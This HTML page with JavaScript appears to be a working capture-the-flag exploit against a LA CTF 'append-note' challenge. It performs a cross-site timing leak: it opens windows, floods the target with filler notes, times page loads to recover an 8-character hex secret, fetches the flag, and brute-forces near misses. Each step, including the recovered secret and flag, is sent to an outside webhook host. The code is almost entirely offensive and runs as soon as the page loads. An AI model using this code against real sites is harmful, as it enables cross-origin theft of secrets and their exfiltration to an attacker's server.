<!DOCTYPE html>
<html>
<head><title>XS-Leak Final</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-lcpbp.instancer.lac.tf";
var WEBHOOK = "https://wild-cat-98.webhook.cool";
var CHARS = "0123456789abcdef";
var SAMPLES = 5; // samples per char per position

function report(msg) {
    navigator.sendBeacon(WEBHOOK, msg);
    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
}

report("FINAL_V1");

// Measure actual load time via form navigation + polling
function measureTime(content) {
    return new Promise(function(resolve) {
        var url = TARGET + "/append?content=" + encodeURIComponent(content) + "&url=" + encodeURIComponent(TARGET + "/?_=" + Math.random());
        var wname = "w" + Math.random().toString(36).slice(2);
        
        // Pre-open window to avoid popup blocker
        var w = window.open("about:blank", wname);
        
        var form = document.createElement("form");
        form.method = "GET";
        form.action = url;
        form.target = wname;
        document.body.appendChild(form);
        
        var t0 = performance.now();
        form.submit();
        document.body.removeChild(form);
        
        // Poll for cross-origin error (= page loaded on target domain)
        var tries = 0;
        var maxTries = 500; // 5 seconds max
        var iv = setInterval(function() {
            tries++;
            try {
                // If we can read location, still on about:blank
                var loc = w.location.href;
                if (loc !== "about:blank") {
                    // Navigated but still same-origin? Unlikely
                }
            } catch(e) {
                // Cross-origin error = page loaded
                clearInterval(iv);
                var elapsed = performance.now() - t0;
                try { w.close(); } catch(x) {}
                resolve(elapsed);
                return;
            }
            if (tries >= maxTries) {
                clearInterval(iv);
                var elapsed = performance.now() - t0;
                try { w.close(); } catch(x) {}
                resolve(elapsed);
            }
        }, 10);
    });
}

// Pollute notes with garbage to amplify timing difference
async function pollute(count) {
    report("POLLUTING_" + count);
    for (var i = 0; i < count; i++) {
        await measureTime("ZZZZZZ" + i); // Non-hex prefix, won't match real secret
    }
    report("POLLUTED");
}

// Get median of multiple measurements
async function getMedianTime(prefix) {
    var times = [];
    for (var s = 0; s < SAMPLES; s++) {
        var t = await measureTime(prefix);
        times.push(t);
    }
    times.sort(function(a, b) { return a - b; });
    return times[Math.floor(times.length / 2)];
}

async function trySecret(secret) {
    try {
        var resp = await fetch(TARGET + "/flag?secret=" + secret);
        var text = await resp.text();
        if (text.indexOf("lactf") !== -1) {
            report("FLAG=" + text);
            document.getElementById("s").textContent = text;
            return true;
        }
    } catch(e) {}
    return false;
}

async function main() {
    report("START");
    document.getElementById("s").textContent = "Starting...";
    
    try {
        // Step 1: Pollute notes with 50 garbage entries
        // This makes 404 slower (must check all notes) vs 200 (matches SECRET first)
        document.getElementById("s").textContent = "Polluting...";
        await pollute(30);
        
        // Step 2: Timing attack
        var secret = "";
        
        for (var pos = 0; pos < 8; pos++) {
            document.getElementById("s").textContent = "P" + pos + "/8: " + secret;
            
            var results = [];
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                var time = await getMedianTime(secret + c);
                results.push({ c: c, time: time });
            }
            
            // Sort by time - fastest should be correct (200 short-circuits on SECRET)
            results.sort(function(a, b) { return a.time - b.time; });
            
            var fastest = results[0];
            var slowest = results[results.length - 1];
            var gap = slowest.time - fastest.time;
            
            report("P" + pos + ":F=" + fastest.c + "(" + Math.round(fastest.time) + ")S=" + slowest.c + "(" + Math.round(slowest.time) + ")G=" + Math.round(gap));
            
            secret += fastest.c;
        }
        
        report("SECRET=" + secret);
        
        // Step 3: Try the secret
        document.getElementById("s").textContent = "Trying " + secret;
        if (await trySecret(secret)) return;
        
        // Step 4: Bruteforce variations if timing was slightly off
        report("BRUTEFORCE");
        for (var pos = 0; pos < 8; pos++) {
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                if (secret[pos] === c) continue;
                var variant = secret.substr(0, pos) + c + secret.substr(pos + 1);
                if (await trySecret(variant)) return;
            }
        }
        
        report("NOFLAG");
        document.getElementById("s").textContent = "Not found";
        
    } catch(e) {
        report("ERR=" + e.message);
    }
}

main();
</script>
</body>
</html>
